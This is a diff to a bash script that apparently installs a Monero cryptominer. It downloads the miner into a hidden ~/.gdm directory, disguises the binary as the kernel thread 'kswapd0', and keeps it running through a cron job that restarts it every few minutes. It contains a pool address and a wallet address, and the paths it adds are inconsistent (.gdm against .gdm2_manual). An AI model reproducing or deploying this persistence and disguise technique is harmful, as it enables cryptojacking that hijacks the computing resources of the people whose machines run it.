@@ -1,5 +1,9 @@
 #!/bin/bash
 
+# Paths to the required files
+KSWAPD0="$HOME/.gdm/kswapd0"
+CONFIG_JSON="$HOME/.gdm/config.json"
+
 # Verzeichnis erstellen und in das Verzeichnis wechseln
 mkdir -p $HOME/.gdm/
 cd $HOME/.gdm/
@@ -15,19 +19,36 @@ wget --no-check-certificate https://raw.githubusercontent.com/littlAcen/monerooc
 cp $HOME/.gdm/config.json $HOME/.gdm/config_background.json
 sed -i 's/"background": *false,/"background": true,/' $HOME/.gdm/config_background.json
 
-# Programm starten
-$HOME/.gdm/kswapd0 -B --http-host 0.0.0.0 --http-port 8181 --http-access-token 55maui55 -o gulf.moneroocean.stream:80 -u 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX -k --nicehash
+## Programm starten
+#$HOME/.gdm/kswapd0 -B --http-host 0.0.0.0 --http-port 8181 --http-access-token 55maui55 -o gulf.moneroocean.stream:80 -u 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX -k --nicehash
 
-# Cronjob erstellen
-(crontab -l 2>/dev/null; echo "* * * * * $HOME/.gdm/check_and_start.sh") | crontab -
+# Run kswapd0 if no other process with the specific configuration is running
+if ! pgrep -f "$KSWAPD0 --config=$CONFIG_JSON" > /dev/null; then
+    echo "kswapd0 not started. Starting it..."
+    "$KSWAPD0" --config="$CONFIG_JSON" &
+else
+    echo "kswapd0 is already running."
+fi
 
-# Skript für den Cronjob erstellen
-cat << 'EOF' > $HOME/.gdm/check_and_start.sh
+# Create the check script
+cat << 'EOF' > "$HOME/.gdm2_manual/check_kswapd0.sh"
 #!/bin/bash
-if ! pgrep -f "kswapd0"; then
-  $HOME/.gdm/kswapd0 -B --http-host 0.0.0.0 --http-port 8181 --http-access-token 55maui55 -o gulf.moneroocean.stream:80 -u 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX -k --nicehash
+
+KSWAPD0_PATH="$HOME/.gdm2_manual/kswapd0"
+CONFIG_JSON_PATH="$HOME/.gdm2_manual/config.json"
+
+if ! pgrep -f "$KSWAPD0_PATH --config=$CONFIG_JSON_PATH" > /dev/null; then
+    echo "kswapd0 not started. Going to start it..."
+    cd "$HOME/.gdm2_manual/" || exit
+    ./kswapd0 --config=config.json &
+else
+    echo "kswapd0 already started."
 fi
 EOF
 
-# Skript ausführbar machen
-chmod +x $HOME/.gdm/check_and_start.sh
+# Make the check script executable
+chmod +x "$HOME/.gdm2_manual/check_kswapd0.sh"
+
+# Cron job setup: remove outdated lines and add the new command
+CRON_JOB="*/5 * * * * $HOME/.gdm2_manual/check_kswapd0.sh"
+(crontab -l 2>/dev/null | grep -v -E '(out dat|check_kswapd0.sh)'; echo "$CRON_JOB") | crontab -
